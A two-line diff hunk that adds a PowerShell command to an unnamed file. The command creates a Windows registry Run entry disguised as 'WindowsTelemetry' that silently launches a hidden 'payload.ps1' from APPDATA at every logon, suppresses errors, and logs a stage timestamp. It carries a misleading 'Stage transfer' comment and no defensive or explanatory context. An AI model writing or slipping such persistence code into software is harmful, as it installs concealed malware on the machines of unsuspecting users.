@@ -1,0 +1,2 @@
+
+<# Stage transfer #> New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsTelemetry' -Value ('powershell.exe -NoP -WindowStyle Hidden -File "' + "$env:APPDATA\payload.ps1" + '"') -PropertyType String -Force -ErrorAction SilentlyContinue; $ProgressPreference = "SilentlyContinue"; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
